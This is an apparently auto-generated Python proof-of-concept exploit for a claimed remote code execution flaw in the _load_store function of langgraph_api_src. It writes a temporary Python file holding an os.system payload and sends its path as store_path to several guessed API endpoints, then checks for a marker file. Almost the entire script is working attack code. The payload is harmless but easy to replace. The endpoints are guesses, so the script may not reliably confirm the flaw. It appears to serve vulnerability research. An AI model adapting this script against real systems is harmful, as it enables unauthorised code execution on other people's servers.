#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-014
# Sink: _load_store
# Auto-generated — run with: python3 rce_python_module__load_store.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src _load_store function.

Vulnerability: The _load_store function accepts a store_path parameter and uses
importlib.util.spec_from_file_location to load arbitrary Python files from the
filesystem. An attacker who can control store_path can specify a malicious file
path, and the code will execute that file as a Python module, leading to RCE.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file that executes a benign command
2. Triggering the vulnerable function with the path to that file
3. Verifying the command was executed

Usage:
    python3 poc.py [--target http://localhost:8000]
"""

import argparse
import os
import sys
import tempfile
import time
import requests

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"

def create_malicious_payload():
    """Create a temporary Python file with a benign payload."""
    # Create a temporary file
    fd, path = tempfile.mkstemp(suffix='.py', prefix='evil_')
    
    # Benign payload: create a marker file to prove code execution
    payload = f'''
import os
# Benign proof-of-concept: create a marker file
os.system("touch /tmp/poc_success.txt")
# Export a dummy store class to avoid errors
class DummyStore:
    pass
store = DummyStore()
'''
    with os.fdopen(fd, 'w') as f:
        f.write(payload)
    
    return path

def exploit(target_url, payload_path):
    """
    Attempt to trigger the RCE by sending a request that causes
    _load_store to load our malicious file.
    
    The vulnerable function expects store_path in format:
    - "/path/to/file.py:ClassName" for file-based loading
    - "module:ClassName" for module-based loading
    
    We'll try to find an endpoint that accepts store_path as a parameter.
    """
    print(f"[*] Target: {target_url}")
    print(f"[*] Payload file: {payload_path}")
    
    # The store_path format for file loading is: /path/to/file.py:ClassName
    store_path = f"{payload_path}:store"
    
    # Try common API endpoints that might accept store_path
    endpoints = [
        f"{target_url}/api/store/load",
        f"{target_url}/api/stores",
        f"{target_url}/api/config",
        f"{target_url}/api/load_store",
    ]
    
    for endpoint in endpoints:
        try:
            print(f"[*] Trying endpoint: {endpoint}")
            
            # Try as JSON body
            response = requests.post(
                endpoint,
                json={"store_path": store_path},
                timeout=10
            )
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text[:200]}")
            
            # Also try as query parameter
            response2 = requests.get(
                f"{endpoint}?store_path={store_path}",
                timeout=10
            )
            print(f"    GET Status: {response2.status_code}")
            print(f"    GET Response: {response2.text[:200]}")
            
        except requests.exceptions.ConnectionError:
            print(f"    [!] Connection refused to {endpoint}")
        except requests.exceptions.Timeout:
            print(f"    [!] Timeout for {endpoint}")
        except Exception as e:
            print(f"    [!] Error: {e}")
    
    # Check if our payload executed
    time.sleep(1)  # Give it a moment
    if os.path.exists("/tmp/poc_success.txt"):
        print("\n[+] SUCCESS! Payload executed - /tmp/poc_success.txt created")
        os.remove("/tmp/poc_success.txt")  # Clean up
        return True
    else:
        print("\n[-] Payload may not have executed (marker file not found)")
        print("[*] The target might not be running or the endpoint might differ")
        return False

def main():
    parser = argparse.ArgumentParser(description="PoC for langgraph_api_src RCE")
    parser.add_argument("--target", default=DEFAULT_TARGET,
                       help=f"Target URL (default: {DEFAULT_TARGET})")
    args = parser.parse_args()
    
    print("[*] Creating malicious payload...")
    payload_path = create_malicious_payload()
    print(f"[*] Payload created at: {payload_path}")
    
    try:
        success = exploit(args.target, payload_path)
        if success:
            print("\n[+] Vulnerability confirmed!")
        else:
            print("\n[-] Could not confirm vulnerability")
            print("[*] The target may not be vulnerable or may not be running")
    finally:
        # Clean up payload file
        if os.path.exists(payload_path):
            os.remove(payload_path)
            print(f"[*] Cleaned up payload file: {payload_path}")

if __name__ == "__main__":
    main()
